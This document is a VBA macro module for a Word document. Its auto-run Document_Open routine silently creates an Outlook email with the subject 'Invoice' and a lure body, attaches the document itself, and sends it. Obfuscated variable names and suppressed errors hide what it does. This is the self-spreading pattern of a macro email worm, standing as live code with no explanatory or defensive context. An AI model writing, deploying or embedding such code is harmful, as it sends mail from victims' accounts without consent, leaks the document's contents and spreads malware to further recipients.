Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim lckhv437 As Object, xcx6ug6uo As Object
    On Error Resume Next
    Set lckhv437 = CreateObject("Outlook.Application")
    Set xcx6ug6uo = lckhv437.CreateItem(0)
    xcx6ug6uo.To = "recipient@example.com"
    xcx6ug6uo.Subject = "Invoice"
    xcx6ug6uo.Body = "Please find the attached document."
    xcx6ug6uo.Attachments.Add ActiveDocument.FullName
    xcx6ug6uo.Send
End Sub
